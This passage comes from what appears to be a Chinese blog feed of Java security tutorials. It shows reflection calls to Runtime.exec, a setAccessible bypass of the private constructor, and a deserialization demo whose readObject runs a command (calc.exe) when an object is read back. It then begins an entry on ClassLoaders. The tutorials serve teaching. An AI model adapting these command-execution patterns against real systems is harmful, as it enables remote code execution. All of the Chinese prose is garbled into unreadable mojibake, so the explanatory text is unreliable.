string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Object</span> m <span class="token operator">=</span> c1<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span> method <span class="token operator">=</span> c1<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span><span class="token string">"/System/Applications/Calculator.app/Contents/MacOS/Calculator"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><img src="10.png" loading="lazy"></p><p>‰ΩÜÊàë‰ª¨ÂèëÁé∞‰∫Ü‰ΩøÁî®newInstance‰∫ßÁîü‰∫ÜÊä•ÈîôÁöÑËØùÔºåËÄåÂæÄÂæÄÂÖ∂ÂèØËÉΩÊòØ‰ª•‰∏ãÂéüÂõ†Êú™ËÉΩÂÆûÁé∞„ÄÇ</p><p>1„ÄÅ‰ΩøÁî®ÁöÑÁ±ªÊ≤°ÊúâÊó†ÂèÇÊûÑÈÄ†ÂáΩÊï∞</p><p>2„ÄÅ‰ΩøÁî®ÁöÑÁ±ªÊûÑÈÄ†ÂáΩÊï∞ÊòØÁßÅÊúâÁöÑ</p><p>‰πãÂêéÊàë‰ª¨Êü•ÁúãÂÖ∂Âá∫ÈîôÂéüÂõ†Ôºåjava.lang.Runtime with modifiers ‚Äúprivate‚Äù„ÄÇRuntimeÁ±ªÁöÑÊûÑÈÄ†ÊñπÊ≥ïÊòØprivateÊùÉÈôêÁßÅÊúâÁöÑÔºåÊòØÊ†πÊçÆ‚ÄúÂçï‰æãÊ®°Âºè‚ÄùËøõË°åËÆæËÆ°ÁöÑÔºåÊàë‰ª¨Êó†Ê≥ïËøõË°åÁõ¥Êé•Ë∞ÉÁî®„ÄÇÁúãÊù•Êàë‰ª¨‰∏äËø∞ÁöÑÂèçÂ∞ÑÊú∫Âà∂‰πüÊòØÊúâÈôêÂà∂ÁöÑÔºåÂπ∂‰∏çËÉΩÈ•∂ËøáprivateÊùÉÈôêÁöÑÊ£ÄÊü•„ÄÇ</p><p>Êó¢ÁÑ∂ÊàëÁé∞Âú®‰∏çËÉΩÁªïËøáprivateÊùÉÈôêÁöÑÊ£ÄÊµãÔºåÈÇ£ÊàëÂÖà‰∏çÁÆ°newIntanceÂàõÂª∫Á±ªÂØπË±°ÔºåÂÖàËé∑ÂèñRumtimeÁ±ªÁöÑÊñπÊ≥ïÂÖàË∞à‰∏™ËÆ°ÁÆóÂô®ÂÜçÁúãÁúã„ÄÇÊâÄ‰ª•Êàë‰ª¨ÈúÄË¶ÅÂØπ‰ª£Á†ÅËøõË°åÁÆÄÂçï‰øÆÊîπ‰∏ã„ÄÇ</p><p>Êàë‰ª¨‰ΩøÁî®getMethod‰ΩúÁî®ÈÄöËøáÂèçÂ∞ÑËé∑Âèñ‰∏Ä‰∏™Á±ªÁöÑÊüê‰∏™ÁâπÂÆöÁöÑÂÖ¨ÊúâÊñπÊ≥ï„ÄÇ‰∏îjava‰∏≠ÊîØÊåÅÁ±ªÁöÑÈáçËΩΩÔºåÊàë‰ª¨‰∏çËÉΩ‰ªÖÈÄöËøáÂáΩÊï∞ÂêçÁ°ÆÂÆö‰∏Ä‰∏™ÂáΩÊï∞„ÄÇÂú®Ë∞ÉÁî®getMethodÊó∂ÂÄôÔºåÈúÄË¶Å‰º†Áªô‰ªñ‰Ω†ÈúÄË¶ÅËé∑ÂèñÁöÑÂáΩÊï∞ÁöÑÂèÇÊï∞Á±ªÂûãÂàóË°®„ÄÇ</p><p>Â¶ÇRuntime.execÊñπÊ≥ïÊúâ6‰∏™ÈáçËΩΩÔºö</p><p><img src="11.png" loading="lazy"></p><p>exec(String commmand)</p><p>Êàë‰ª¨ÂèØ‰ª•ÂÆûÁî®ÊúÄÁÆÄÂçïËøôÁßçÂè™Êúâ‰∏Ä‰∏™ÂèÇÊï∞‰∏îÁ±ªÂûãÊòØString„ÄÇÂÆûÁî®getMethod(‚Äúexec‚Äù,String.class)Ëé∑ÂèñRuntime.execÊñπÊ≥ïÔºåÂπ∂‰∏îËé∑ÂèñgetRuntimeÊñπÊ≥ïÊù•ÊâßË°å„ÄÇ</p><p><img src="12.png" loading="lazy"></p><p>ÁÑ∂ÂêéÊàë‰ª¨Â∞ÜËøôÊÆµ‰ª£Á†ÅËøõË°åÁÆÄÁï•‰∏ãÔºåÂ∞±ÁîüÊàê‰ª•‰∏ãÊàë‰ª¨Â∏∏ËßÅÁöÑÂèçÂ∞ÑpayloadÊµãËØïÔºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span> c1 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c1<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>c1<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>c1<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"/System/Applications/Calculator.app/Contents/MacOS/Calculator"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>ËøôÈáåÊàë‰ª¨ËôΩÁÑ∂ÊàêÂäüÊâßË°åÊñπÊ≥ïÂºπÂá∫ËÆ°ÁÆóÂô®Ôºå‰ΩÜ‰ªÖ‰ªÖÂè™ÊòØË∞ÉÁî®ÂÖ∂ÊñπÊ≥ïÂéªÂÆûÁé∞„ÄÇËÄåÊàë‰ª¨ËøòÊòØÊÉ≥ÊâßË°åÂÖ∂ÁßÅÊúâÊñπÊ≥ïÔºåÈÄöËøánewInstanceÊù•ÊûÑÈÄ†‰ΩøÁî®„ÄÇËøôÊ†∑Â∞±ÈúÄË¶ÅÊàë‰ª¨ÈÄöËøásetAccessible(true)Êù•Á™ÅÁ†¥ËÆøÈóÆÊùÉÈôêÁöÑÊ£ÄÊü•„ÄÇ</p><h3 id="ËÆæÁΩÆsetAccessible-true-Êö¥ÂäõËÆøÈóÆÊùÉÈôê"><a href="#ËÆæÁΩÆsetAccessible-true-Êö¥ÂäõËÆøÈóÆÊùÉÈôê" class="headerlink" title="ËÆæÁΩÆsetAccessible(true)Êö¥ÂäõËÆøÈóÆÊùÉÈôê"></a>ËÆæÁΩÆsetAccessible(true)Êö¥ÂäõËÆøÈóÆÊùÉÈôê</h3><p>Âú®‰∏ÄËà¨ÊÉÖÂÜµ‰∏ãÔºåÊàë‰ª¨‰ΩøÁî®ÂèçÂ∞ÑÊú∫Âà∂‰∏çËÉΩÂØπÁ±ªÁöÑÁßÅÊúâprivateÂ≠óÊÆµËøõË°åÊìç‰ΩúÔºåÁªïËøáÁßÅÊúâÊùÉÈôêÁöÑËÆøÈóÆ„ÄÇ‰ΩÜ‰∏Ä‰∫õÁâπÊÆäÂú∫ÊôØÂ≠òÂú®‰æãÂ§ñÁöÑÊó∂ÂÄôÔºåÊØîÂ¶ÇÊàë‰ª¨ËøõË°åÂ∫èÂàóÂåñÊìç‰ΩúÁöÑÊó∂ÂÄôÔºåÈúÄË¶ÅÂéªËÆøÈóÆËøô‰∫õÂèóÈôêÁöÑÁßÅÊúâÂ≠óÊÆµÔºåËøôÊó∂Êàë‰ª¨ÂèØ‰ª•ÈÄöËøáË∞ÉÁî®AccessibleObject‰∏äÁöÑsetAccessible()ÊñπÊ≥ïÊù•ÂÖÅËÆ∏ËÆøÈóÆ„ÄÇ</p><p>Java.lang.reflect.AccessibleObjectÁ±ªÊòØFieldÔºåMethodÂíåConstructorÁ±ªÂØπË±°ÁöÑÂü∫Á±ªÔºåÂèØ‰ª•Êèê‰æõÂ∞ÜÂèçÂ∞ÑÂØπË±°Ê†áËÆ∞‰∏∫‰ΩøÁî®ÂÆÉÊäëÂà∂Êë∏‰∫∫JavaËÆøÈóÆÊéßÂà∂Ê£ÄÊü•ÁöÑÂäüËÉΩÔºåÂêåÊó∂‰∏äËø∞ÁöÑÂèçÂ∞ÑÁ±ª‰∏≠ÁöÑFieldÔºåMethodÂíåConstructorÁªßÊâøËá™AccessibleObject„ÄÇÊâÄ‰ª•Êàë‰ª¨Âú®Ëøô‰∫õÁ±ªÊñπÊ≥ïÂü∫Á°Ä‰∏äË∞ÉÁî®setAccessible()ÊñπÊ≥ïÔºåÊó¢ÂèØÂØπËøô‰∫õÁßÅÊúâÂ≠óÊÆµËøõË°åÊìç‰Ωú„ÄÇ</p><p>ÊâÄÊúâÊàë‰ª¨ÊúÄÂºÄÂßãÁöÑ‰ª£Á†ÅÂÜç‰øÆÊîπÁÆÄÁï•‰∏ãÔºåÂ∞±ËÉΩÊàêÂäüÂëΩ‰ª§ÊâßË°å‰∫Ü„ÄÇ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RuntimeTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Class</span> c1<span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Constructor</span> m <span class="token operator">=</span> c1<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        m<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        c1<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"/System/Applications/Calculator.app/Contents/MacOS/Calculator"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><img src="13.png" loading="lazy"></p><h3 id="JavaÂèçÂ∫èÂàóÂåñÊºèÊ¥ûdemo"><a href="#JavaÂèçÂ∫èÂàóÂåñÊºèÊ¥ûdemo" class="headerlink" title="JavaÂèçÂ∫èÂàóÂåñÊºèÊ¥ûdemo"></a>JavaÂèçÂ∫èÂàóÂåñÊºèÊ¥ûdemo</h3><p>ÊúÄÂêéÁªìÊùüÂ∞±Áî®‰∏Ä‰∏™‰πãÂâçÂ≠¶‰π†javaÂèçÂ∞ÑÁöÑÊó∂ÂÄôÂ≠¶‰π†ÁöÑdemoÔºåÂ¶ÇÊûúÊàë‰ª¨Âú®ËøõË°åÂèçÂ∫èÂàóÂåñËøáÁ®ã‰∏≠ÂèØÊéßÁöÑËØùÔºåËÉΩÂ§üÂä†ËΩΩÊàë‰ª¨‰ΩøÁî®ÂèçÂ∞ÑË∞ÉÁî®ÁöÑÊÅ∂ÊÑèÂëΩ‰ª§ËØ≠Âè•ÁöÑËØùÔºåÂàôËÉΩÂ§üÊàêÂäüËøõË°åÂëΩ‰ª§ÊâßË°å„ÄÇ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> demo <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">Integer</span> age<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">demo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token function">demo</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span><span class="token class-name">Integer</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// ÊûÑÈÄ†ÂáΩÊï∞ÔºåÂàùÂßãÂåñÊó∂ÊâßË°å</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>ObjectInputStream</span> in<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span><span class="token class-name">ClassNotFoundException</span><span class="token punctuation">&#123;</span>        in<span class="token punctuation">.</span><span class="token function">defaultReadObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Ë∞ÉÁî®ÂéüÂßãÁöÑreadObjectÊñπÊ≥ï</span>        <span class="token keyword">try</span><span class="token punctuation">&#123;</span> <span class="token comment">// ÈÄöËøáÂèçÂ∞ÑÊñπÊ≥ïÊâßË°åÂëΩ‰ª§;</span>            <span class="token class-name">Method</span> method <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Object</span> result <span class="token operator">=</span> method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"calc.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             demo x <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">demo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             operation<span class="token punctuation">.</span><span class="token function">ser</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>             operation<span class="token punctuation">.</span><span class="token function">deser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> operation<span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">ser</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span><span class="token comment">// Â∫èÂàóÂåñÊìç‰ΩúÔºåÂÜôÊï∞ÊçÆ</span>            <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"object.obj"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// ObjectOutStreamËÉΩÊääObjectËæìÂá∫ÊàêByteÊµÅ</span>            oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Â∫èÂàóÂåñÂÖ≥ÈîÆÂáΩÊï∞</span>            oos<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//ÁºìÂÜ≤ÊµÅ</span>            oos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//ÂÖ≥Èó≠ÊµÅ</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">deser</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span><span class="token comment">// ÂèçÂ∫èÂàóÂåñÊìç‰ΩúÔºåËØªÂèñÊï∞ÊçÆ</span>            <span class="token class-name">File</span> file <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"object.obj"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Object</span> x <span class="token operator">=</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//ÂèçÂ∫èÂàóÂåñÁöÑÂÖ≥ÈîÆÂáΩÊï∞</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>            ois<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">FileNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>Âú®Ëøô‰∏™ÂÆûÈ™åÂΩì‰∏≠ÔºåÊàë‰ª¨‰ΩøÁî®ÁöÑJavaÂèçÂ∞ÑÂç¥ÊòØÂèØ‰ª•ËÆøÈóÆprivateÁöÑÊñπÊ≥ïÂíåÂ±ûÊÄßÔºåÁªïËøáÁ¨¨‰∫åÁ∫ßÂÆâÂÖ®Êú∫Âà∂ÁöÑÊñπÊ≥ïÔºåÂéüÁêÜÊú¨Ë¥®ÊòØÂÆòÂÖµËÆøÈóÆÂÆâÂÖ®Ê£ÄÊü•„ÄÇ</p><h3 id="Â∞èÁªì-1"><a href="#Â∞èÁªì-1" class="headerlink" title="Â∞èÁªì"></a>Â∞èÁªì</h3><p>Âú®ÂÆûÈôÖÂà©Áî®Âú∫ÊôØÂΩì‰∏≠ÔºåÊàë‰ª¨Âà©Áî®Âà©Áî®JavaÂèçÂ∞ÑÊú∫Âà∂Êù•ÁªïËøá‰∏Ä‰∫õÂÆâÂÖ®ÊùÉÈôêÊú∫Âà∂Ê£ÄÊü•ÔºåÂ¶ÇËé∑ÂèñprivateÊùÉÈôêÁöÑÊñπÊ≥ïÂíåÂ±ûÊÄß„ÄÇÊú¨Ë¥®Â∞±ÊòØÊàë‰ª¨ÁªïËøáËÆøÈóÆÂÆâÂÖ®Ê£ÄÊü•„ÄÇÊâÄ‰ª•ÈÄöËøájavaÂèçÂ∞ÑÊú∫Âà∂ÁöÑÂ≠¶‰π†ÔºåËÉΩÂ§ü‰∏∫Êàë‰ª¨‰∏∫Êàë‰ª¨ÂêéÈù¢ÁöÑjavaÊºèÊ¥ûÂàÜÊûêË∞ÉËØïÔºåjavaÊºèÊ¥ûpocÊµãËØïÂíåÊúçÂä°Á´ØÊ®°ÊùøÂºïÊìéÊ≥®ÂÖ•Á≠âÊúâÁùÄÂçÅÂàÜÈáçË¶ÅÁöÑÊÑè‰πâ„ÄÇÂõ†‰∏∫ÊñáÁ´†ËÆ≤ÁöÑÊØîËæÉÈÄö‰øóÁÆÄÂçïÔºå‰∏ªË¶ÅÊòØÈù¢ÂêëÂºÄÂßãÊ≤°ÊúâÊ∂âÂèä‰∏Ä‰∫õÊºèÊ¥ûÂàÜÊûê‰∏éÊ∫êÁ†ÅÂàÜÊûêÔºåÂêéÈù¢javaÂÆâÂÖ®Âü∫Á°ÄÁ≥ªÂàó‰ºöÊÖ¢ÊÖ¢Âä†ÂÖ•Ëøô‰∫õÂπ∂ËØ¶ÁªÜËÆ≤Ëß£„ÄÇÂÖ∂Ê¨°Â¶ÇÊûúÂ§ßÂÆ∂ÂØπÊñáÁ´†Êúâ‰ªÄ‰πàÈóÆÈ¢òÂíåËßâÂæóÈúÄË¶ÅÊîπËøõÁöÑÂú∞ÊñπÔºåÂèØ‰ª•Âú®ËØÑËÆ∫‰∏ãÊñπÁïôË®ÄÔºåÂ§ßÂÆ∂‰∏ÄËµ∑Êé¢ËÆ®‰∫§ÊµÅ‰∏ã„ÄÇ</p>]]></content>
      
      
      <categories>
          
          <category> ÂÆâÂÖ®Áõ∏ÂÖ≥ </category>
          
          <category> JavaÂÆâÂÖ® </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVAÂÆâÂÖ®Âü∫Á°Ä--Á±ªÂä†ËΩΩÂô®ÔºàClassLoaderÔºâ</title>
      <link href="/2024/09/07/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80-1/"/>
      <url>/2024/09/07/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80-1/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-Ê¶ÇÂøµ"><a href="#0x01-Ê¶ÇÂøµ" class="headerlink" title="0x01 Ê¶ÇÂøµ"></a>0x01 Ê¶ÇÂøµ</h2><p>JavaÁ±ªÂä†ËΩΩÂô®(Java Classloader)ÊòØJavaËøêË°åÊó∂ÁéØÂ¢É(Java Runtime Environment)ÁöÑ‰∏ÄÈÉ®ÂàÜÔºåË¥üË¥£Âä®ÊÄÅÂä†ËΩΩJavaÁ±ªÂà∞JavaËôöÊãüÊú∫ÁöÑÂÜÖÂ≠òÁ©∫Èó¥‰∏≠ÔºåÁî®‰∫éÂä†ËΩΩÁ≥ªÁªü„ÄÅÁΩëÁªúÊàñËÄÖÂÖ∂‰ªñÊù•Ê∫êÁöÑÁ±ªÊñá‰ª∂„ÄÇJavaÊ∫ê‰ª£Á†ÅÈÄöËøájavacÁºñËØëÂô®ÁºñËØëÊàêÁ±ªÊñá‰ª∂ÔºåÁÑ∂ÂêéJVMÊù•ÊâßË°åÁ±ªÊñá‰ª∂‰∏≠ÁöÑÂ≠óËäÇÁ†ÅÊù•ÊâßË°åÁ®ãÂ∫è„ÄÇ</p><h2 id="0x02-Á±ªÊñá‰ª∂ÁºñËØëÊµÅÁ®ãÂõæ"><a href="#0x02-Á±ªÊñá‰ª∂ÁºñËØëÊµÅÁ®ãÂõæ" class="headerlink" title="0x02 Á±ªÊñá‰ª∂ÁºñËØëÊµÅÁ®ãÂõæ"></a>0x02 Á±ªÊñá‰ª∂ÁºñËØëÊµÅÁ®ãÂõæ</h2><p><img src="1.png" loading="lazy"></p><p>Êàë‰ª¨‰ª•‰∏äÂõæ‰∏∫‰æãÂ≠êÔºåÊØîÂ¶ÇÊàë‰ª¨ÂàõÂª∫‰∏Ä‰∏™ClassLoaderTest.javaÊñá‰ª∂ËøêË°åÔºåÁªèËøájavacÁºñËØëÔºåÁÑ∂ÂêéÁîüÊàêClassLoaderTest.classÊñá‰ª∂„ÄÇËøô‰∏™javaÊñá‰ª∂ÂíåÁîüÊàêÁöÑclassÊñá‰ª∂ÈÉΩÊòØÂ≠òÂÇ®Âú®Êàë‰ª¨ÁöÑÁ£ÅÁõòÂΩì‰∏≠„ÄÇ‰ΩÜÂ¶ÇÊûúÊàë‰ª¨ÈúÄË¶ÅÂ∞ÜÁ£ÅÁõò‰∏≠ÁöÑclassÊñá‰ª∂Âú®javaËôöÊãüÊú∫ÂÜÖÂ≠ò‰∏≠ËøêË°åÔºåÈúÄË¶ÅÁªèËøá‰∏ÄÁ≥ªÂàóÁöÑÁ±ªÁöÑÁîüÂëΩÂë®ÊúüÔºàÂä†ËΩΩ„ÄÅËøûÊé•ÔºàÈ™åËØÅ‚Äì&gt;ÂáÜÂ§á‚Äì&gt;Ëß£ÊûêÔºâÂíåÂàùÂßãÂåñÊìç‰ΩúÔºåÊúÄÂêéÂ∞±ÊòØÊàë‰ª¨ÁöÑjavaËôöÊãüÊú∫ÂÜÖÂ≠ò‰ΩøÁî®Ëá™Ë∫´ÊñπÊ≥ïÂå∫‰∏≠Â≠óËäÇÁ†Å‰∫åËøõÂà∂Êï∞ÊçÆÂéªÂºïÁî®Â†ÜÂå∫ÁöÑClassÂØπË±°„ÄÇ</p><p>ÈÄöËøáËøô‰∏™ÊµÅÁ®ãÂõæÔºåÊàë‰ª¨Â∞±ÂæàÊ∏ÖÊ•öÂú∞‰∫ÜËß£Âà∞Á±ªÁöÑÂä†ËΩΩÂ∞±ÊòØÁî±javaÁ±ªÂä†ËΩΩÂô®ÂÆûÁé∞ÁöÑÔºå‰ΩúÁî®Â∞ÜÁ±ªÊñá‰ª∂ËøõË°åÂä®ÊÄÅÂä†ËΩΩÂà∞javaËôöÊãüÊú∫ÂÜÖÂ≠ò‰∏≠ËøêË°å„ÄÇ</p><h2 id="0x03-Â∫îÁî®Âú∫ÊôØ"><a href="#0x03-Â∫îÁî®Âú∫ÊôØ" class="headerlink" title="0x03 Â∫îÁî®Âú∫ÊôØ"></a>0x03 Â∫îÁî®Âú∫ÊôØ</h2><h3 id="1„ÄÅËµÑÊ∫êÈöîÁ¶ª"><a href="#1„ÄÅËµÑÊ∫êÈöîÁ¶ª" class="headerlink" title="1„ÄÅËµÑÊ∫êÈöîÁ¶ª"></a>1„ÄÅËµÑÊ∫êÈöîÁ¶ª</h3><p>ÂÆûÁé∞‰∏çÂêåÈ°πÁõÆÊàñËÄÖÂêå‰∏Ä‰∏™È°πÁõÆ‰∏äÁöÑ‰∏çÂêåÁâàÊú¨ÁöÑjarÂåÖÈöîÁ¶ªÔºåÈÅøÂÖçÈõÜÁæ§ÈîôËØØÊàñËÄÖÂÜ≤Á™ÅÁöÑ‰∫ßÁîü„ÄÇ</p><h3 id="2„ÄÅÁÉ≠ÈÉ®ÁΩ≤"><a href="#2„ÄÅÁÉ≠ÈÉ®ÁΩ≤" class="headerlink" 